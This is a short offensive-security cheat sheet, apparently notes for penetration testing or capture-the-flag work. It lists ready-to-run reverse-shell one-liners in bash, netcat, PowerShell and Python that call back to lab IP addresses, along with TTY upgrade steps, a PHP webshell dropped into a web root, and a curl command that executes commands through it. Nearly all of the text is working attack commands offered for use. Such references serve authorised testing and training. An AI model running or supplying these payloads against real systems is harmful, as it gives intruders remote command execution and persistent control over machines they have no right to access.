```
python3 -c 'import pty; pty.spawn("/bin/bash")'	
```


https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md

 
 -i = interactive shell  0>&1 standard output to input  
echo "bash -i >& /dev/tcp/10.10.14.98/9999 0>&1" | base64 -w 0


Starts a python server

```
python3 -m http.server 9999
```



Powershell reverse shell
Powercat 
https://github.com/besimorhino/powercat.git


```
bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'	
```
Send a reverse shell from the remote server


```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 1234 >/tmp/f	
```
Another command to send a reverse shell from the remote server




nc 10.10.10.1 1234	
Connect to a bind shell started on the remote server


python3 -c 'import pty; pty.spawn("/bin/bash")'	
Upgrade shell TTY (1)

ctrl+z then stty raw -echo then fg then enter twice
Upgrade shell TTY (2)



echo "<?php system(\$_GET['cmd']);?>" > /var/www/html/shell.php	
Create a webshell php file


curl http://SERVER_IP:PORT/shell.php?cmd=id	
Execute a command on an uploaded webshell

Powershell Reverse shell
```
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',1234);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()"
```

Python reverse shell
```
#!/usr/bin/python3
from os import dup2
from subprocess import run
import socket
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("127.0.0.1",8888)) 
dup2(s.fileno(),0) 
dup2(s.fileno(),1) 
dup2(s.fileno(),2) 
run(["/bin/bash","-i"])
```
